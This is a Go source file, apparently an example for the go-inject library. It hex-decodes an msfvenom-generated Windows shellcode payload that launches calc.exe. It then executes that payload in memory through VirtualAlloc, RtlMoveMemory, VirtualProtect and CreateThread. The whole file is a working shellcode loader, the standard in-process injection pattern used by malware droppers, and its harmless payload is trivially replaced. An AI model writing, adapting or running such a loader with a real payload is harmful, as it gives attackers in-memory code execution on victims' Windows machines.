package main

import (
	"encoding/hex"
	"fmt"
	"os"

	"github.com/zaneGittins/go-inject/inject"

	"golang.org/x/sys/windows"
)

func main() {

	// msfvenom -p windows/exec -ax86 CMD=calc.exe -f hex
	var payload string = "fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6a018d85b20000005068318b6f87ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd563616c632e65786500"

	sc, err := hex.DecodeString(payload)
	if err != nil {
		fmt.Printf("\nError decoding shellcode: %s\n", err)
		os.Exit(1)
	}

	// Reserve space to drop shellcode
	address := inject.VirtualAlloc(uintptr(0), len(sc), 0x3000, windows.PAGE_EXECUTE_READWRITE)

	// Copy Data
	inject.RtlMoveMemory2(address, sc)

	// Change Protection
	inject.VirtualProtect(address, len(sc), windows.PAGE_EXECUTE_READ)

	// Create thread
	thread := inject.CreateThread(address)

	// Wait for completion
	inject.WaitForSingleObject(thread, 0xFFFFFFFF)
}
